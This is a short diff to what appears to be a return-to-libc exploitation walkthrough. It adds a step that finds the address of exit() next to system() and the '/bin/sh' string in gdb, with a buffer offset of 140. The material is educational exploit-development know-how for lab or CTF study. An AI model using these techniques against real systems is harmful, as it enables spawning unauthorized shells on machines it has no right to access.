@@ -645,10 +645,12 @@ Stack level 0, frame at 0xbffff760:
 (gdb) print 0xbffff75c - 0xbffff6d0
 $1 = 140
 ```
-The second step is to find addresse of `system()` function and the pointer to the string "/bin/sh".
+The second step is to find addresse of `system()`, `exit()` functions and the pointer to the string "/bin/sh".
 ```gdb
 (gdb) print system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 (gdb) find &system,+9999999,"/bin/sh"
 0xb7f8cc58
 ```
